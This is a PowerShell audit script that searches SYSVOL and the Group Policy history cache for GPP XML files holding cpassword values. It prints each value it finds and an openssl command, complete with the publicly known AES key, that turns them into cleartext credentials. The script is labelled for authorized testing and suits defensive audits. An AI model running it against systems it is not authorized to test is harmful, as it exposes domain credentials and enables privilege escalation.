<#
.SYNOPSIS
    Search SYSVOL for Group Policy Preferences XML files containing cpassword=
    attributes. The cpassword AES key is publicly known (MS published it in a
    KB article) so any cpassword= value is effectively cleartext.

.DESCRIPTION
    GPP cpassword is the classic "Domain Admin in a single file" finding.
    Files to check (per MS):
        Groups.xml         - local user creation / password set
        Services.xml       - service runas creds
        ScheduledTasks.xml - task runas creds
        DataSources.xml    - ODBC creds
        Printers.xml       - printer install creds
        Drives.xml         - mapped-drive creds

    This script enumerates SYSVOL mounts visible to the current user
    (\\<domain>\SYSVOL and the GPO history cache) and surfaces every
    cpassword= match. The actual AES decryption is left to the operator
    (gpp-decrypt or a one-liner OpenSSL).

.NOTES
    Authorized testing only. Read-only.
#>
[CmdletBinding()]
param(
    [string[]]$Path = @(
        "\\$env:USERDNSDOMAIN\SYSVOL",
        "C:\ProgramData\Microsoft\Group Policy\History"
    )
)

function Hit($t)  { Write-Host "[+] $t" -ForegroundColor Green }
function Miss($t) { Write-Host "[-] $t" -ForegroundColor DarkGray }
function Hdr($t)  { Write-Host ""; Write-Host ("="*70) -ForegroundColor Cyan
                    Write-Host "  $t" -ForegroundColor Cyan
                    Write-Host ("="*70) -ForegroundColor Cyan }

Hdr "GROUP POLICY PREFERENCES — cpassword sweep"

$hits = 0
foreach ($p in $Path) {
    if (-not (Test-Path -LiteralPath $p)) {
        Miss "Path not reachable: $p"
        continue
    }
    "Searching: $p"
    $files = Get-ChildItem -LiteralPath $p -Recurse `
        -Include 'Groups.xml','Services.xml','ScheduledTasks.xml','DataSources.xml','Printers.xml','Drives.xml' `
        -ErrorAction SilentlyContinue
    foreach ($f in $files) {
        try {
            $text = Get-Content -LiteralPath $f.FullName -Raw -ErrorAction Stop
        } catch { continue }
        if ($text -match 'cpassword="[^"]+"') {
            # Surface the full file path + the cpassword line. Operator decrypts.
            $matches = ([regex]::Matches($text, 'cpassword="([^"]+)"'))
            foreach ($m in $matches) {
                Hit "GPP cpassword= in $($f.FullName) — value: $($m.Groups[1].Value)"
                $hits++
            }
        }
    }
}

""
"GPP cpassword findings: $hits"
if ($hits -gt 0) {
    Hit "CRITICAL: cpassword AES key is public — every match decrypts to cleartext."
    "Decrypt example (openssl):"
    "  echo -n '<cpassword>' | base64 -d -w0 | openssl enc -d -aes-256-cbc \\"
    "    -K 4e9906e8fcb66cc9faf49310620ffee8f496e806cc057990209b09a433b66c1b \\"
    "    -iv 0000000000000000 -nopad"
}
